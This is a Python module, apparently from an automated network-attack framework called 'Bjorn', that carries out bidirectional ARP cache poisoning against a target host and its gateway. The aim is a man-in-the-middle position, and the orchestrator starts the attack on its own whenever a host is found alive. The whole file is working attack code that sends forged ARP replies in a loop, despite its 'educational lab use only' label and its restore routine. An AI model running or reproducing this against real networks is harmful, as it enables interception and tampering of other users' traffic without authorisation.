"""arp_spoofer.py - Bidirectional ARP cache poisoning for MITM positioning.

Spoofs target<->gateway ARP entries; auto-restores tables on exit.
"""

import os
import time
import logging
import json
import subprocess
import datetime

from typing import Dict, Optional, Tuple

from shared import SharedData
from logger import Logger

logger = Logger(name="arp_spoofer.py", level=logging.DEBUG)

# Silence scapy warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
logging.getLogger("scapy").setLevel(logging.ERROR)

# ──────────────────────── Action Metadata ────────────────────────
b_class         = "ARPSpoof"
b_module        = "arp_spoofer"
b_status        = "arp_spoof"
b_port          = None
b_service       = '[]'
b_trigger       = "on_host_alive"
b_parent        = None
b_action        = "aggressive"
b_category      = "network_attack"
b_name          = "ARP Spoofer"
b_description   = (
    "Bidirectional ARP cache poisoning between target host and gateway for "
    "MITM positioning. Detects gateway automatically, spoofs both directions, "
    "and cleanly restores ARP tables on completion. Educational lab use only."
)
b_author        = "Bjorn Team"
b_version       = "2.0.0"
b_icon          = "ARPSpoof.png"

b_requires      = '{"action":"NetworkScanner","status":"success","scope":"global"}'
b_priority      = 30
b_cooldown      = 3600
b_rate_limit    = "2/86400"
b_timeout       = 300
b_max_retries   = 1
b_stealth_level = 2
b_risk_level    = "high"
b_enabled       = 1
b_tags          = ["mitm", "arp", "network", "layer2"]

b_args = {
    "duration": {
        "type": "slider", "label": "Duration (s)",
        "min": 10, "max": 300, "step": 10, "default": 60,
        "help": "How long to maintain the ARP poison (seconds)."
    },
    "interval": {
        "type": "slider", "label": "Packet interval (s)",
        "min": 1, "max": 10, "step": 1, "default": 2,
        "help": "Delay between ARP poison packets."
    },
}
b_examples = [
    {"duration": 60, "interval": 2},
    {"duration": 120, "interval": 1},
]
b_docs_url = "docs/actions/ARPSpoof.md"

# ──────────────────────── Constants ──────────────────────────────
_DATA_DIR  = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data")
OUTPUT_DIR = os.path.join(_DATA_DIR, "output", "arp")


class ARPSpoof:
    """ARP cache poisoning action integrated with Bjorn orchestrator."""

    def __init__(self, shared_data: SharedData):
        self.shared_data = shared_data
        self._ip_to_identity: Dict[str, Tuple[Optional[str], Optional[str]]] = {}
        self._refresh_ip_identity_cache()
        self._scapy_ok = False
        self._check_scapy()
        try:
            os.makedirs(OUTPUT_DIR, exist_ok=True)
        except OSError:
            pass
        logger.info("ARPSpoof initialized")

    def _check_scapy(self):
        try:
            from scapy.all import ARP, Ether, sendp, sr1  # noqa: F401
            self._scapy_ok = True
        except ImportError:
            logger.error("scapy not available - ARPSpoof will not function")
            self._scapy_ok = False

    # ─────────────────── Identity Cache ──────────────────────
    def _refresh_ip_identity_cache(self):
        self._ip_to_identity.clear()
        try:
            rows = self.shared_data.db.get_all_hosts()
        except Exception as e:
            logger.error(f"DB get_all_hosts failed: {e}")
            rows = []
        for r in rows:
            mac = r.get("mac_address") or ""
            if not mac:
                continue
            hn = (r.get("hostnames") or "").split(";", 1)[0]
            for ip_addr in [p.strip() for p in (r.get("ips") or "").split(";") if p.strip()]:
                self._ip_to_identity[ip_addr] = (mac, hn)

    def _mac_for_ip(self, ip: str) -> Optional[str]:
        if ip not in self._ip_to_identity:
            self._refresh_ip_identity_cache()
        return self._ip_to_identity.get(ip, (None, None))[0]

    # ─────────────────── Gateway Detection ──────────────────
    def _detect_gateway(self) -> Optional[str]:
        """Auto-detect the default gateway IP."""
        gw = getattr(self.shared_data, "gateway_ip", None)
        if gw and gw != "0.0.0.0":
            return gw
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True, text=True, timeout=5
            )
            if result.returncode == 0 and result.stdout.strip():
                parts = result.stdout.strip().split("\n")[0].split()
                idx = parts.index("via") if "via" in parts else -1
                if idx >= 0 and idx + 1 < len(parts):
                    return parts[idx + 1]
        except Exception as e:
            logger.debug(f"Gateway detection via ip route failed: {e}")
        try:
            from scapy.all import conf as scapy_conf
            gw = scapy_conf.route.route("0.0.0.0")[2]
            if gw and gw != "0.0.0.0":
                return gw
        except Exception as e:
            logger.debug(f"Gateway detection via scapy failed: {e}")
        return None

    # ─────────────────── ARP Operations ──────────────────────
    @staticmethod
    def _get_mac_via_arp(ip: str, iface: str = None, timeout: float = 2.0) -> Optional[str]:
        """Resolve IP to MAC via ARP request."""
        try:
            from scapy.all import ARP, sr1
            kwargs = {"timeout": timeout, "verbose": False}
            if iface:
                kwargs["iface"] = iface
            resp = sr1(ARP(pdst=ip), **kwargs)
            if resp and hasattr(resp, "hwsrc"):
                return resp.hwsrc
        except Exception as e:
            logger.debug(f"ARP resolution failed for {ip}: {e}")
        return None

    @staticmethod
    def _send_arp_poison(target_ip, target_mac, spoof_ip, iface=None):
        """Send a single ARP poison packet (op=is-at)."""
        try:
            from scapy.all import ARP, Ether, sendp
            pkt = Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
            )
            kwargs = {"verbose": False}
            if iface:
                kwargs["iface"] = iface
            sendp(pkt, **kwargs)
        except Exception as e:
            logger.error(f"ARP poison send failed to {target_ip}: {e}")

    @staticmethod
    def _send_arp_restore(target_ip, target_mac, real_ip, real_mac, iface=None):
        """Restore legitimate ARP mapping with multiple packets."""
        try:
            from scapy.all import ARP, Ether, sendp
            pkt = Ether(dst=target_mac) / ARP(
                op=2, pdst=target_ip, hwdst=target_mac,
                psrc=real_ip, hwsrc=real_mac
            )
            kwargs = {"verbose": False, "count": 5}
            if iface:
                kwargs["iface"] = iface
            sendp(pkt, **kwargs)
        except Exception as e:
            logger.error(f"ARP restore failed for {target_ip}: {e}")

    # ─────────────────── Main Execute ────────────────────────
    def execute(self, ip: str, port: str, row: Dict, status_key: str) -> str:
        """Execute bidirectional ARP spoofing against target host."""
        self.shared_data.bjorn_orch_status = "ARPSpoof"
        self.shared_data.bjorn_progress = "0%"
        self.shared_data.comment_params = {"ip": ip}

        if not self._scapy_ok:
            logger.error("scapy unavailable, cannot perform ARP spoof")
            return "failed"

        target_mac = None
        gateway_mac = None
        gateway_ip = None
        iface = None

        try:
            if self.shared_data.orchestrator_should_exit:
                return "interrupted"

            mac = row.get("MAC Address") or row.get("mac_address") or ""
            hostname = row.get("Hostname") or row.get("hostname") or ""

            # 1) Detect gateway
            gateway_ip = self._detect_gateway()
            if not gateway_ip:
                logger.error(f"Cannot detect gateway for ARP spoof on {ip}")
                return "failed"
            if gateway_ip == ip:
                logger.warning(f"Target {ip} IS the gateway - skipping")
                return "failed"

            logger.info(f"ARP Spoof: target={ip} gateway={gateway_ip}")
            self.shared_data.log_milestone(b_class, "GatewayID", f"Poisoning {ip} <-> {gateway_ip}")
            self.shared_data.comment_params = {"ip": ip, "gateway": gateway_ip}
            self.shared_data.bjorn_progress = "10%"

            # 2) Resolve MACs
            iface = getattr(self.shared_data, "default_network_interface", None)
            target_mac = self._get_mac_via_arp(ip, iface)
            gateway_mac = self._get_mac_via_arp(gateway_ip, iface)

            if not target_mac:
                logger.error(f"Cannot resolve MAC for target {ip}")
                return "failed"
            if not gateway_mac:
                logger.error(f"Cannot resolve MAC for gateway {gateway_ip}")
                return "failed"

            self.shared_data.bjorn_progress = "20%"
            logger.info(f"Resolved - target_mac={target_mac}, gateway_mac={gateway_mac}")
            self.shared_data.log_milestone(b_class, "PoisonActive", f"MACs resolved, starting spoof")

            # 3) Spoofing loop
            duration = int(getattr(self.shared_data, "arp_spoof_duration", 60))
            interval = max(1, int(getattr(self.shared_data, "arp_spoof_interval", 2)))
            packets_sent = 0
            start_time = time.time()

            while (time.time() - start_time) < duration:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit - stopping ARP spoof")
                    break
                self._send_arp_poison(ip, target_mac, gateway_ip, iface)
                self._send_arp_poison(gateway_ip, gateway_mac, ip, iface)
                packets_sent += 2

                elapsed = time.time() - start_time
                pct = min(90, int(20 + (elapsed / max(duration, 1)) * 70))
                self.shared_data.bjorn_progress = f"{pct}%"
                
                if packets_sent % 20 == 0:
                     self.shared_data.log_milestone(b_class, "Status", f"Injected {packets_sent} poison pkts")

                time.sleep(interval)

            # 4) Restore ARP tables
            self.shared_data.bjorn_progress = "95%"
            logger.info("Restoring ARP tables...")
            self.shared_data.log_milestone(b_class, "RestoreStart", f"Healing {ip} and {gateway_ip}")
            self._send_arp_restore(ip, target_mac, gateway_ip, gateway_mac, iface)
            self._send_arp_restore(gateway_ip, gateway_mac, ip, target_mac, iface)

            # 5) Save results
            elapsed_total = time.time() - start_time
            result_data = {
                "timestamp": datetime.datetime.now().isoformat(),
                "target_ip": ip, "target_mac": target_mac,
                "gateway_ip": gateway_ip, "gateway_mac": gateway_mac,
                "duration_s": round(elapsed_total, 1),
                "packets_sent": packets_sent,
                "hostname": hostname, "mac_address": mac
            }
            try:
                ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                out_file = os.path.join(OUTPUT_DIR, f"arp_spoof_{ip}_{ts}.json")
                with open(out_file, "w") as f:
                    json.dump(result_data, f, indent=2)
            except Exception as e:
                logger.error(f"Failed to save results: {e}")

            self.shared_data.bjorn_progress = "100%"
            self.shared_data.log_milestone(b_class, "Complete", f"Restored tables after {packets_sent} pkts")
            return "success"

        except Exception as e:
            logger.error(f"ARPSpoof failed for {ip}: {e}")
            if target_mac and gateway_mac and gateway_ip:
                try:
                    self._send_arp_restore(ip, target_mac, gateway_ip, gateway_mac, iface)
                    self._send_arp_restore(gateway_ip, gateway_mac, ip, target_mac, iface)
                    logger.info("Emergency ARP restore sent after error")
                except Exception:
                    pass
            return "failed"
        finally:
            self.shared_data.bjorn_progress = ""


if __name__ == "__main__":
    shared_data = SharedData()
    try:
        spoofer = ARPSpoof(shared_data)
        logger.info("ARPSpoof module ready.")
    except Exception as e:
        logger.error(f"Error: {e}")
